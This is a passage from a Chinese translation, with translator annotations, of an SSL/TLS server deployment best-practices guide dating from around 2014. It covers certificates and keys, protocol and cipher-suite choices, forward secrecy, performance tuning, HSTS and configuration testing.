的局面。我们进行了对全局TLS使用情况的完整调查，以及实现了在线检测工具，但文
档缺乏的问题依然存在。这份文档是解决这个问题过程中的一步。&lt;/p&gt;

&lt;p&gt;我们的目标是让已经不堪负重的系统管理员和程序员尽可能花费少量时间就能完
成安全站点或Web应用的部署，正是因为我们的目的如此，所以这份文档可能不够完备，遗漏了
一些高级主题。因此，我们只提供简单实用容易理解的建议。
对于那些想了解更多信息的读者，可以看看 Section 6。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;1. 私钥和证书&lt;/h2&gt;

&lt;p&gt;TLS提供的安全质量完全依赖于私钥和证书。私钥是安全的基础，而证书则用于向访问者表明
服务器的身份。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;1.1 使用2048位的私钥&lt;/h3&gt;

&lt;p&gt;在你的所有服务器上使用2048位的RSA，或者等价强度的256位ECDSA私钥。密钥的强度能
保证在相当长时间内的安全，如果你已经使用1024位的RSA，尽快替换它们。如果你
的安全需求必须使用大于2048位的密钥，请考虑ECDSA，因为性能不错。不过ECDSA的缺点
是小部分客户端不支持，因此你有可能需要同时部署RSA和ECDSA以确保互操作性。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：RSA 1024的强度相当于分组加密的80-96bit，已经被视为不安全。[T1]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-3&quot;&gt;1.2 保护私钥&lt;/h3&gt;

&lt;p&gt;私钥是重要的资产，尽可能限制能接触到私钥的人。推荐策略包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在一台可信的计算机(Shawn注:加固过的物理机器)上生成私钥和CSR(
Certificate Signing Requests)。有一些CA会为你生成密钥和CSR，但这样做
明显不妥。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;受密码保护的密钥可以防止从备份系统中泄漏。然而私钥密码在生产系统中使用的
帮助是有限的，因为这并不能阻止一个聪明的攻击者从进程内存中截获私钥。
一些硬件设备可以在服务器被攻陷的情况下确保私钥安全，但这些昂贵的设备
只在对安全有严格要求的机构中使用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在发现系统被攻陷后，吊销老的证书，生成新的密钥和证书。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;每年更新证书，同时更新私钥。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-4&quot;&gt;1.3 确保充分的域名覆盖&lt;/h3&gt;

&lt;p&gt;确保你的证书覆盖到目标站点的所有活跃域名。比如你的主站是www.example.com，但
你可能还有个www.example.net。你的目标就是避免无效证书警告，因为那会让你
的用户产生疑惑从而影响对你的信任。&lt;/p&gt;

&lt;p&gt;即使你的服务器只有一个主机名配置，也要记得你不能控制用户是通过什么路径
访问你的站点的，可能是其他的链接过来的。大部分情况下，你应该保证证书能
在没有www前缀的情况下工作(比如，example.com和www.example.com)。这里经验法则
就是：一个安全的WEB服务器应该有一个对所有DNS名称解析都合法的证书配置。&lt;/p&gt;

&lt;p&gt;通配符证书(Wildcard certificates)有它的适用场景。但如果这样的配置意味着
暴露私钥给不必要的人群（特别是在跨越部门边界的情形下），则应该避免使用。
换句话说，越少的人能访问私钥越好。此外，要意识到共享证书可能会导致安全漏洞
从一个站点扩散到所有使用相同证书的站点。&lt;/p&gt;

&lt;h3 id=&quot;ca&quot;&gt;1.4 从靠谱的CA那里获得证书&lt;/h3&gt;

&lt;p&gt;选择一个对待安全业务认真可靠的CA( Certificate Authority)。在选择CA过程
中考虑以下因素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对待安全的态度&lt;/p&gt;

    &lt;p&gt;大多的CA都会有常规的安全审计（否则根本没有资格当CA），但是其中一些会更重视
安全。搞清楚哪些更重视安全不是一件容易的事情，但一个可行的做法
是看看他们在安全方面的历史状况，他们如何响应攻击事件以及如何从错误中学习。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;足够大的市场占有率&lt;/p&gt;

    &lt;p&gt;满足此因素的CA不太可能轻易撤销所有证书，而这种事情过去曾发生在小的CA身上。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;业务重心&lt;/p&gt;

    &lt;p&gt;如果一家机构的核心业务是CA，那么一旦出现严重问题，他们将会受到严重影响。
因此这些CA不太可能因为追逐利润而忽视证书部门的重要性。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;提供哪些服务&lt;/p&gt;

    &lt;p&gt;在最底线的情况，你选择的CA至少应该提供CRL( Certificate List)和OCSP(
Online Certificate Status Protocol)这两种召回机制，并且提供一个高性能的OCSP服务。
CA至少提供域名验证和扩展证书验证功能，最理想的情况可以让你自己选择公
钥算法(今天大多站点都使用RSA，但在未来ECDSA的性能优势可能会变得重要。)&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;Shawn注：这里作者可能指的是ECDH/ECDHE_ECDSA，即ECDH密钥交换+ECDSA签名的证书或者ECDH算出TLS的临时session key+ECDSA签名&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;证书管理选项&lt;/p&gt;

    &lt;p&gt;如果你的运维环境很复杂，需要一大堆的证书，那么选择一个能提供良好管理工具的
CA。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;技术支持&lt;/p&gt;

    &lt;p&gt;选择一个技术支持优秀的CA提供商。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-5&quot;&gt;1.5 选择强算法签名证书&lt;/h3&gt;

&lt;p&gt;证书签名的安全依赖于签名私钥的强度，以及所使用的哈希函数强度。
今天大多数证书使用并不足够安全的SHA1哈希函数。业界正在逐渐
淘汰SHA1，而最后期限则是2016年末，这之后SHA1证书就不可接受了。&lt;/p&gt;

&lt;p&gt;然而，Google Chrome在大限到来之前就开始对SHA1证书发出警告，如果你的证书
在2015年左右就要到期，你应该立刻替换这些证书。作为替代，你可以直奔SHA2
算法家族。不过在你动手之前，你需要先看看你的用户是否支持SHA2。一些旧客户
端，例如 Windows XP SP2 的 IE 6 就不支持（但依然在一些国家和机构重度使用）。&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;2. 配置&lt;/h2&gt;

&lt;p&gt;使用正确的TLS服务器配置，才能够确保将你的信任凭证正确的展现给站点的访问者，
确保只有安全的加密原语被使用，而且确保规避所有已知的安全风险。&lt;/p&gt;

&lt;h3 id=&quot;section-7&quot;&gt;2.1 部署有效的证书链&lt;/h3&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效和客户端浏览器报警告，这个问题有时候
不是那么容易被检测到，因为有些浏览器可以自己重构一个完整的信任链而有些
则不行。&lt;/p&gt;

&lt;p&gt;在绝大多数部署场景中，仅服务器自身一个证书是不够的。一般需要多个证书建立一个信
任链。一个常见的问题是正确的配置了服务器证书但却忘了包含其他所需要的
证书。此外，虽然这些其他的证书通常有很长的有效期，但它们也会过期。而且一旦它们过
期就会使整个信任链作废。你的CA应该向你提供所有额外需要的证书。&lt;/p&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效，并且导致客户端浏览器报警。而实际上，这个问题有时候
难以诊断，因为有些浏览器可以自己重构一个完整的信任链而其他浏览器则不行。&lt;/p&gt;

&lt;h3 id=&quot;section-8&quot;&gt;2.2 使用安全的协议&lt;/h3&gt;

&lt;p&gt;在SSL/TLS家族中有5种协议：SSLv2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: TLS v1.3还在draft阶段&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v2不安全，坚决不能用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: OpenSSL和GnuTLS当前的版本(2014.12.2)不支持SSL v2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v3用于HTTP已经被确认为不安全，用于其他协议时安全强度也不足。
它已经过时，不应该再被使用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li注: POODLE漏洞的出现彻底的废掉了SSLv3，受其影响，
  大量程序和库彻底取消了对SSLv3的支持。其实之前很多地方支持SSLv3
  的原因是兼容性问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.0在很大程度上是安全的。当用于非HTTP协议时，我们还不知道存在任何
已知的重大安全漏洞。当用于HTTP协议时，我们能够通过精心的服务器配置，来保证
它几乎是安全的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.1和TLS v1.2没有已知的安全漏洞曝光。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: 由于Edward Snowden曝光的内容有关于NSA“今天记录，明天解密”的故事，
  所以大量的自由软件社区和暗网使者们在过去1年中(2013.7–2014)转向了TLS v1.2的PFS，2015年4月，[PCI-DSS v3.1] (https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-1.pdf)规定所有SSL的版本以及早期TLS版本将于2016年6月30日后不再支持)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：某一些TLS 1.x实现由于没有正确实现对PADDING的校验，同样存在POODLE脆弱性问题。
  这些有问题的TLS实现包括F5，A10，Checkpoint, Cisco等厂家的设备。
  同样，Lucky 13攻击一样对老版本的OpenSSL, GnuTLS，F5等大量库/设备实现有效。
  请确认打上补丁。[T2][T3]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;TLS v1.2应该成为你的主要协议。这个版本有巨大的优势是因为它有之前版本
没有的特性。如果你的服务器平台（或中间设备）不支持TLS v1.2，做个升
级计划吧。如果你的服务提供商不支持TLS v1.2，要求他们升级。&lt;/p&gt;

&lt;p&gt;对于那些老的客户端，你还是需要继续支持TLS v1.0和TLS v1.1。使用临时的解
决方案（接下来会介绍），这些协议对于大多WEB站点依然被认为是足够安全的。&lt;/p&gt;

&lt;h3 id=&quot;cipher-suite&quot;&gt;2.3 使用安全的加密套件(Cipher Suite)&lt;/h3&gt;

&lt;p&gt;要安全的通信，首先得保证你是和你想通信的另一方直接通信（而不是
冒充者或者存在能够监听的中间人），并且安全的交换数据。
在SSL/TLS里，加密套件是定义你如何安全通信的。
它们由一堆多样化的组件组成，以确保安全。如果其中一个组件被发现是不安全的，
你应该切换到其他的组件上。&lt;/p&gt;

&lt;p&gt;你的目标应该是仅使用128位或者更强的加密、认证套件，其他都应该被排除掉：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Anonymous Diffie-Hellman (ADH) 套件不提供认证功能&lt;/li&gt;
  &lt;li&gt;NULL cipher suites不提供加密&lt;/li&gt;
  &lt;li&gt;出口密钥交换套件 (Export key exchange suites) 使用容易被破解的认证&lt;/li&gt;
  &lt;li&gt;使用强度不够的加密算法(比如40或者56位的加密强度)也容易被破解&lt;/li&gt;
  &lt;li&gt;RC4比之前想象的要弱，你应该在检查好兼容问题后，尽快去除掉&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li 注：2015年三月曝光的手段将RC4攻击实用化，RC4坚决不要再用 [T4]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;3DES仅提供大约112位的安全系数，这也低于推荐的最低128位，不过依然足够强。
但实践中更大的问题是，她比其他替代算法要慢很多。所以，出于性能我们不推荐她，
但她依然可以放在加密套件的最后面，用来兼容非常陈旧的客户端&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li 注：RC4安全漏洞曝光后，这是老旧客户端唯一能用的算法了&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-9&quot;&gt;2.4 控制加密套件选型&lt;/h3&gt;

&lt;p&gt;在SSL v3和后来的版本里，客户端提交一个她支持的加密套件的列表，服务
器从列表中选择一个去跟客户端做协商，以构建一个安全的通信信道。
然而不是所有的服务器都能很好处理这个过程，一些服务器仅仅会简单的从列表中选择第一个。
让服务器选择正确的加密套件对于安全而言是极端重要的（详见 Section 2.7）。&lt;/p&gt;

&lt;h3 id=&quot;forward-secrecy&quot;&gt;2.5 支持正向安全（Forward Secrecy）&lt;/h3&gt;

&lt;p&gt;正向安全是一个协议特性，它使得安全会话不依赖于服务器的私钥。
当使用不支持正向安全的加密套件时，如果攻击者记录了通信内容，那么她可
以在未来获得私钥后，再解密先前的一切通信。你需要优先支持ECDHE套装，
来让浏览器选择支持正向安全。
为了支持更广泛的客户端，可将DHE套件作为ECDHE的协商回退（fallback)方案。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: NSA就在干这件事情，所以看出PFS有多重要了吧&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-10&quot;&gt;2.6 关闭客户端发起的重协商&lt;/h3&gt;

&lt;p&gt;在SSL/TLS里，重协商允许一方停止交换数据而去重新协商一个安全会话。有一些
场景需要服务器发起重协商的请求，但客户端并没有发起重协商请求的必要。此
外，曾经出现过客户端发起重协商请求的拒绝服务攻击。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注解: 每个重协商请求服务器的计算量是客户端的15倍&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-11&quot;&gt;2.7 降低已知漏洞风险&lt;/h3&gt;

&lt;p&gt;没有什么是绝对安全的，很多防护方案都会随着时间推移成为安全问题。最佳实
践是随时关注信息安全的世界在发生些什么，然后采取必要的措施。最简单的是你
应该尽快的打每一个补丁。&lt;/p&gt;

&lt;p&gt;下面的一些问题应该引起你的注意：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;关闭不安全的重协商&lt;/p&gt;

    &lt;p&gt;重协商特性在2009年时被发现是不安全的，协议需要更新。今天大部分厂商已
经修复，至少提供了一个临时方案。不安全的重协商很危险，因为她很容易被
利用，用来进行跨站请求伪造（CSFR）攻击，并在某些情况下引发跨站脚本（XSS）
攻击。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭TLS压缩&lt;/p&gt;

    &lt;p&gt;2012年，CRIME攻击[6]向我们展示了TLS压缩所导致的信息泄漏可以被攻击者用
于还原部分的敏感数据(比如session cookies)。只有几款客户端支持TLS
压缩（而现在就更少了），所以即使关掉TLS压缩，也完全不会遇到服务器性能
问题。针对TLS压缩的攻击风险有限。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;降低HTTP压缩的信息泄漏风险&lt;/p&gt;

    &lt;p&gt;2个CRIME的变种攻击在2013年被曝光，不像CRIME针对TLS压缩，TIME和BREACH
漏洞是针对压缩过的HTTP响应。HTTP压缩对于很多公司都很重要，这个
问题不容易解决。风险减缓方案可能需要修改业务代码。&lt;/p&gt;

    &lt;p&gt;对于TIME和BREACH攻击，只要攻击者有足够攻击你的理由，那影响等同于CSRF。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭RC4&lt;/p&gt;

    &lt;p&gt;RC4 cihpersuites已经被认为是不安全而且应该关闭。目前，对于攻击者最好
的情况需要百万次的请求，和大量的带宽。因此危害是比较低的，不过我们期待
未来有改进的攻击手法。在去除RC4之前，检查这是否会影响现有的用户；换句话
说，你应该查查有没有仅支持RC4的客户端。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注意BEAST攻击&lt;/p&gt;

    &lt;p&gt;2011年曝光的BEAST攻击是2004年的一个针对TLS 1.0或者更早版本但当时被认
为很难被利用的一个漏洞。一次成功的BEAST攻击的影响约等于会话劫持。在一段时间内，
尽管问题出在客户端，在服务端避免BEAST攻击是合适的。但不幸的是，
服务器需要使用RC4来避免问题，而这已经不再推荐了。因为这个原因，再加上
目前BEAST攻击已经在大量客户端中被解决了，我们不再推荐在服务端避免攻击。
在有大量旧客户端受BEAST攻击影响的情况下，使用RC4和TLS 1.0也许更安全。
如何取舍需要在完全了解环境，建立威胁模型后小心决定。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭SSLv3&lt;/p&gt;

    &lt;p&gt;SSLv3受到2014年10月曝光的POODLE攻击威胁。此攻击很容易被利用来攻击HTTP客户端运行
JavaScript恶意程序。客户端也很容易被攻击者忽悠，从一个更安全的协议（如 TLSv1.2）
降级到不安全的SSLv3。因此最好的解决方案是在服务器完全禁用SSLv3，绝大多数站点都
可以安全的实施。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注: 由于国内仍然存在大量IE 6客户端，不支持TLS 1.x。目前如果必须
  要支持SSLv3，那么只能选择RC4，并注意开启TLS_FALLBACK_SCSV防止降级攻击。
  此外注意库的及时升级，相关漏洞是一茬接着一茬的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-12&quot;&gt;3. 性能&lt;/h2&gt;

&lt;p&gt;这份文档中安全是主要关注点，但我们也必须注意到性能的问题。一个安全服
务不能满足性能需求无疑会被遗弃掉。然而，因为TLS配置通常不会带来很大的性
能开销，我们把讨论限定在会导致严重性能下降的常见配置问题上。&lt;/p&gt;

&lt;h3 id=&quot;section-13&quot;&gt;3.1 不要使用强度过高的私钥&lt;/h3&gt;

&lt;p&gt;在建立一条安全连接的密钥协商的过程当中最大的开销是由私钥大小决定的，使
用密钥过短会不安全，使用密钥过长会的导致在一些场景无法忍受的性能下降。
对于大多的WEB站点，使用超过2048位的RSA/DHE密钥，或者超过256位的ECDSA/ECDHE密钥是浪
费CPU和影响用户体验的。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注：256-bit的&lt;a href=&quot;https://tools.ietf.org/html/rfc4492&quot;&gt;ECC密钥强度&lt;/a&gt;足够胜任很长一段时间&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;session&quot;&gt;3.2 确保正确使用Session重用&lt;/h3&gt;

&lt;p&gt;Session重用是一种性能优化技术，让耗时的密码计算操作的结果在一段时间里可重复使
用。当Session重用机制失效时可能会导致严重性能下降。&lt;/p&gt;

&lt;h3 id=&quot;http&quot;&gt;3.3 使用持久性链接(HTTP)&lt;/h3&gt;

&lt;p&gt;今天绝大多数SSL开销并非来自CPU密集型的密码计算操作，而是网络延迟。一个TLS握
手是建立在TCP握手结束后，她需要交换更多的数据包。为了让网络延迟最小化，
你应该启用HTTP持久化( keep-alives)，从而让你的用户能在一个TCP链接上发多次
HTTP请求。&lt;/p&gt;

&lt;h3 id=&quot;http-1&quot;&gt;3.4 为公共资源开启缓存(HTTP)&lt;/h3&gt;

&lt;p&gt;当使用TLS通信时，浏览器会假设所有的流量都是敏感信息。浏览器会把一些特定的
资源缓存到内存里，但是一旦你关闭了浏览器，这些内容就丢失了。为了提升性
能，为一些资源开启长期缓存，通过加入”Cache-Control: public”返回header给
浏览器标记为公共资源（比如图片）。&lt;/p&gt;

&lt;h3 id=&quot;ocsp-stapling&quot;&gt;3.5 使用 OCSP Stapling&lt;/h3&gt;

&lt;p&gt;OCSP Staling是改版的OSCP协议，使得传递证书吊销信息成为TLS握手的一部分，直接
从服务器传递到浏览器。因此，浏览器不再需要额外联系OCSP服务器来验证服务器，
从而大幅降低连接耗时。&lt;/p&gt;

&lt;h2 id=&quot;http-2&quot;&gt;4. 应用设计（HTTP）&lt;/h2&gt;

&lt;p&gt;HTTP协议和WEB相关平台在SSL诞生后仍然在不断的进化。进化的结果就是有一些
今天包含的特性已经对加密不利。在这个Section里，我们会罗列出这些特性，也
包括如何安全的使用它们。&lt;/p&gt;

&lt;h3 id=&quot;section-14&quot;&gt;4.1 100%的加密你的网站&lt;/h3&gt;

&lt;p&gt;事实上”加密是一个备选“的思想大概是今天最严重的安全问题之一。我们来看看
以下问题：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;网站应该用TLS但没用&lt;/li&gt;
  &lt;li&gt;网站有TLS但不是强制性的使用&lt;/li&gt;
  &lt;li&gt;网站混合了TLS和非TLS的内容，有时候甚至在相同的网页上&lt;/li&gt;
  &lt;li&gt;网站编程错误导致TLS被攻陷&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然如果你知道你自己在做什么的话，这些问题大部分是可以避免的。然而一般而言，
唯一有效的方式是强制对所有的内容通信进行加密 —— 没有豁免。&lt;/p&gt;

&lt;h3 id=&quot;section-15&quot;&gt;4.2 避免混合内容&lt;/h3&gt;

&lt;p&gt;混合内容的页面是已经使用TLS，但有些资源（比如JavaScript文件，图片，
CSS）是通过非TLS的方式传输的。这些页面不安全，主动的中间人攻击者可以劫持这
些不受保护的JavaScript的资源，从而……例如劫持整个用户会话。就算你遵循了前面的
建议加密了自己网站上所有的内容，但也不排除来自第三方网站的资源是没有加密的。&lt;/p&gt;

&lt;h3 id=&quot;section-16&quot;&gt;4.3 理解信任第三方&lt;/h3&gt;

&lt;p&gt;网站通常会通过来自其他服务器的JavaScript代码来使用第三方的服务，Google Analytics是一个
应用广泛的例子。内含的第三方代码创建了一个隐式的信任链，让第三方可以完
全控制你的网站。第三方本身可能并没有恶意，但他们很容易成为攻击者的目标。
原因很简单，如果一个大型第三方提供商被攻陷，那攻击者就可以利用这一路径
导致所有使用它的人全都自动被攻陷。&lt;/p&gt;

&lt;p&gt;如果你采纳了Section 4.2的建议，至少你的第三方链接在加密后可以防止中间人
攻击。此外，你应该进一步去了解你的站点使用了哪些服务，去除、替换或者承担其中的
风险并继续使用。&lt;/p&gt;

&lt;h3 id=&quot;cookies&quot;&gt;4.4 安全Cookies&lt;/h3&gt;

&lt;p&gt;为了安全，网站需要TLS。然而网站使用的cookies也要标记为安全。如果不能保护cookies，就
让中间人攻击者使用诡计获取信息成为可能，即使网站本身是100%加密的。&lt;/p&gt;

&lt;h3 id=&quot;hsts&quot;&gt;4.5 部署HSTS&lt;/h3&gt;

&lt;p&gt;HTTP严格传输安全（HSTS）是TLS协议的保护伞：它被设计成即使存在配置和实现错误的情况下，依然能保证安全。
设置一个简单的响应header就能在支持HSTS的浏览器（目前是 Chrome、FireFox、Safari 和
Opear，IE 很快就会支持）上激活保护。&lt;/p&gt;

&lt;p&gt;HSTS的目的是很简单的：在激活之后，它就会禁止与网站进行任何不安全通信，自动把明文链接转换
成安全链接。一个额外的特性让用户不能无视证书警告（证书警告是
中间人攻击的标志，而研究表明大多数用户都会无视警告，最好永远不要让用户这么做）&lt;/p&gt;

&lt;p&gt;支持HSTS是一项能大幅度提高你网站TLS安全性的措施。新的网站应该在设计的时候就考虑到HSTS，而旧的
站点则应该尽快支持。&lt;/p&gt;

&lt;h3 id=&quot;section-17&quot;&gt;4.6 关闭敏感内容的缓存&lt;/h3&gt;

&lt;p&gt;敏感内容应该被确实看作是敏感，只能发送给该知道的一方。尽管代理服务器看不到加密流量，
也不能把它共享给别人，但是随着基于云的应用在增加，你必须得小心区分公开资源和敏感内容。&lt;/p&gt;

&lt;h3 id=&quot;section-18&quot;&gt;4.7 确保没有其他漏洞&lt;/h3&gt;

&lt;p&gt;TLS不代表就安全，TLS的设计只是涉及安全的一个方面–通信过程中的保密性和
完整性——但还有其他威胁你必须面对。&lt;/p&gt;

&lt;h2 id=&quot;validation&quot;&gt;5. Validation&lt;/h2&gt;

&lt;p&gt;在配置的时候可以进行调整的参数有一大堆，而你很难完全了解修改什么会有什么影响，
而有些时候改动可能是无意的；软件升级也会悄悄引入变化。因此，我们建议使用一款
SSL/TLS评估工具来检查你的配置是不是真的安全，并定期运行检查保证你一直都安全。
对于公开站点，我们推荐使用&lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSLLab网站上的免费在线工具&lt;/a&gt;
它的“握手模拟”功能在实践中非常有用，可以让不同的TLS客户端连接时时候的参数一清二楚。&lt;/p&gt;

&lt;h2 id=&quot;section-19&quot;&gt;6. 高级议题&lt;/h2&gt;

&lt;p&gt;下面的这些议题超出了这份文档的范畴，她们需要对SSL/TLS和公钥架构(PKI)有
更深的理解，这些议题依然是受到争议的。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Extended Validation证书&lt;/p&gt;

    &lt;p&gt;EV证书是很靠谱的证书，只有经过充分的线下审核后才给予颁发。证书的目的是明确
机构和它的对应线上网站的身份联系。EV证书更难伪造，提供了更好的安全性，
并且在浏览器上呈现给用户时的待遇也更高。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Public key pinning&lt;/p&gt;

    &lt;p&gt;Public key pinning的设计是为网站运维能限制哪些CA才可以为他们的网站签
发证书。这个特性是Google开发的，目前已经硬编码到了Chrome浏览器里面，
并且证明对避免攻击和引发大众关注非常有效。在2014年，FireFox也加入了对
硬编码pinning的支持。一个叫做《HTTP的Pubilc Key Pinning扩展》的标准已经
发展了很长时间了，很快讲会发布。我们期待这个特性今后至少被主流浏览器支持。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ECDSA私钥&lt;/p&gt;

    &lt;p&gt;事实上所有的网站都依赖于RSA私钥。这个算法是WEB通信安全的基础。因为一
些原因，我们正在从1024位转向2048位的RSA密钥。而增加密钥长度可能会带来
性能问题。椭圆曲线密码学(ECC)使用了不同的数学，能在较小的密钥长度下有
较强的安全性。RSA密钥可以被ECDSA替代，目前只有少数的CA支持ECDSA，但我
们期待未来会有更多。在迁移到ECDSA的时候，一个主要的问题是并非所有的
客户端都支持它，如果你考虑使用ECDSA，应该确认它是否会影响用户连接服务器。
有些平台支持双密钥部署，可以让你同时使用RSA和ECDSA以适配所有的客户端。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;改动&lt;/p&gt;

&lt;p&gt;这份文档的最初的版本是在2012年2月24日发布的。这个Section跟踪了文档修改
的时间，从1.3开始。&lt;/p&gt;

&lt;p&gt;版本 1.3 (2013年9月17日)
此版本的改动有：
• 推荐替换1024位证书
• 推荐不对SSLv3进行支持
• 删去推荐使用RC4来服务端避免BEAST攻击的内容
• 推荐禁用RC4
• 推荐在未来禁用3DES
• 警告关于CRIME攻击的变种（TIME和BREACH攻击）
• 推荐支持正向安全
• 加入对ECDSA证书的讨论&lt;/p&gt;

&lt;p&gt;版本 1.4 (2014年12月8日）
此版本的改动有：
• 讨论SHA1过时的问题，推荐迁移到SHA2系列算法
• 推荐禁用SSLv3，提及POODLE攻击
• 扩张Sectios 3.1，涵盖DHE和ECDHE密钥交换强度
• 推荐OCSP Stap&lt;/p&gt;

&lt;p&gt;感谢&lt;/p&gt;

&lt;p&gt;为了有价值的反馈和起草这份文档，特别感谢Marsh Ray (PhoneFactor), Nasko
Oskov (Google), Adrian F. Dimcev和Ryan Hurst(GlobalSign)。也感谢其他慷
慨的分享关于信息安全和密码学的人。这份文档虽然是我写的，但这些内容则来
自整个安全社区。&lt;/p&gt;

&lt;p&gt;关于SSL Labs
……………..&lt;/p&gt;

&lt;p&gt;关于Qualys
…………….&lt;/p&gt;

&lt;p&gt;[1] SHA1 Deprecation Policy (Windows PKI blog, 12 November 2013)
http://blogs.technet.com/b/pki/archive/2013/11/12/sha1-deprecation-policy.aspx&lt;/p&gt;

&lt;p&gt;[2] Gradually Sunsetting SHA-1 (The Chromium Blog, 5 September 2014)
http://blog.chromium.org/2014/09/gradually-sunsetting-sha-1.html&lt;/p&gt;

&lt;p&gt;[3] On the Security of RC4 in TLS and WPA (Kenny Paterson et al.; 13 March 2013)
http://www.isg.rhul.ac.uk/tls/&lt;/p&gt;

&lt;p&gt;[4] Deploying Forward Secrecy (Qualys Security Labs; 25 June 2013)
https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy&lt;/p&gt;

&lt;p&gt;[5] Increasing DHE strength on Apache 2.4.x (Ivan Ristić’s blog; 15 August 2013)
http://blog.ivanristic.com/2013/08/increasing-dhe-strength-on-apache.html&lt;/p&gt;

&lt;p&gt;[6] TLS Renegotiation and Denial of Service Attacks (Qualys Security Labs Blog, October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/31/tls-renegotiation-and-denial-of-service-attacks&lt;/p&gt;

&lt;p&gt;[7] SSL and TLS Authentication Gap Vulnerability Discovered (Qualys Security Labs Blog; November 2009)
https://community.qualys.com/blogs/securitylabs/2009/11/05/ssl-and-tls-authentication-gap-vulnerability-discovered&lt;/p&gt;

&lt;p&gt;[8] CRIME: Information Leakage Attack against SSL/TLS (Qualys Security Labs Blog; September 2012)
https://community.qualys.com/blogs/securitylabs/2012/09/14/crime-information-leakage-attack-against-ssltls&lt;/p&gt;

&lt;p&gt;[9] Defending against the BREACH Attack (Qualys Security Labs; 7 August 2013)
https://community.qualys.com/blogs/securitylabs/2013/08/07/defending-against-the-breach-attack&lt;/p&gt;

&lt;p&gt;[10] Internet-Draft: Prohibiting RC4 Cipher Suites (A. Popov, 1 October 2014)
http://datatracker.ietf.org/doc/draft-ietf-tls-prohibiting-rc4/&lt;/p&gt;

&lt;p&gt;[11] Mitigating the BEAST attack on TLS (Qualys Security Labs Blog; October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/17/mitigating-the-beast-attack-on-tls&lt;/p&gt;

